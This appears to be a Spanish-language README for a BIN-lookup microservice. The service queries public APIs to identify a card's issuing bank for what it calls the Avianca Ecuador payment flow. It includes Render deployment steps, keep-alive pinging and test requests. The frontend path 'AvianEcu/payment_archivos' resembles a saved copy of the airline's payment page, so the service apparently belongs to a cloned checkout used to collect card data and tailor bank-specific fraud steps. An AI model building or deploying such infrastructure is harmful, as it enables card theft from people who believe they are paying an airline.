# bin-service

Microservicio de BIN lookup para el flujo de pago de Avianca Ecuador.
Consulta **4 APIs públicas en paralelo** (binlist, handyapi, bins.su, bincheck.io),
gana la primera respuesta que reconoce el banco, cachea 24h en memoria.

## Endpoints

- `GET  /ping`                → healthcheck (para autoping)
- `GET  /bin-check/:bin`      → lookup rápido por URL
- `POST /bin-check`           → body `{ "bin": "424242" }`

Respuesta:
```json
{
  "bin": "42424200",
  "bank": "pichincha",
  "bankRaw": "BANCO PICHINCHA C.A.",
  "scheme": "VISA",
  "type": "credit",
  "country": "EC",
  "source": "binlist",
  "latencyMs": 230,
  "cached": false
}
```

## Desarrollo local

```bash
cd bin-service
npm install
npm start
# test:
curl http://localhost:3000/bin-check/45071500
```

## Deploy en Render (pasos exactos)

1. Crea un repo nuevo en GitHub, sube SOLO la carpeta `bin-service/`.
2. Entra a https://dashboard.render.com → **New** → **Web Service**.
3. Conecta el repo. Render detecta `render.yaml` automáticamente.
4. Si te pide configuración manual:
   - Environment: **Node**
   - Build Command: `npm install`
   - Start Command: `npm start`
   - Plan: **Free**
5. Variables de entorno:
   - `ALLOWED_ORIGIN` = `*` (luego lo cierras a tu dominio).
   - `PUBLIC_URL` = la URL pública que Render te asigne
     (ej. `https://bin-service-xxxx.onrender.com`). **Se setea DESPUÉS del primer deploy**.
6. Primer deploy → copia la URL pública.
7. Vuelve a Environment, pega esa URL en `PUBLIC_URL`, redeploy.
8. Verifica: abre `https://bin-service-xxxx.onrender.com/ping` → debe responder `{ok:true}`.

## Autoping (2 capas)

### Capa 1 — interno (ya integrado)
Cuando defines `PUBLIC_URL`, el server se hace ping a sí mismo cada **10 min**.
Mantiene la instancia despierta mientras esté viva.

### Capa 2 — externo (recomendado, gratis)
Usa UptimeRobot por si la capa 1 se cae:

1. Crea cuenta en https://uptimerobot.com (gratis).
2. **+ Add New Monitor**:
   - Type: **HTTP(s)**
   - URL: `https://bin-service-xxxx.onrender.com/ping`
   - Interval: **5 minutes**
3. Save. Listo, te pega cada 5 min desde afuera.

Alternativa: https://cron-job.org también sirve y es gratis.

## Conectar el frontend

En `AvianEcu/payment_archivos/payment.js` edita:
```js
const BIN_API = 'https://bin-service-xxxx.onrender.com';
```
con la URL real de tu servicio en Render.

## Variables de entorno

| Variable         | Default | Descripción |
|------------------|---------|-------------|
| `PORT`           | 3000    | Puerto HTTP |
| `ALLOWED_ORIGIN` | `*`     | Dominio(s) front permitidos (coma-separados) |
| `PUBLIC_URL`     | —       | URL pública del propio server (activa autoping) |

## Tests rápidos con BINs reales de Ecuador

```bash
curl -s https://bin-service-xxxx.onrender.com/bin-check/45078700 | jq
# esperado: bank: "pichincha"

curl -s https://bin-service-xxxx.onrender.com/bin-check/45449400 | jq
# esperado: bank: "guayaquil"

curl -s https://bin-service-xxxx.onrender.com/bin-check/47965500 | jq
# esperado: bank: "austro"
```
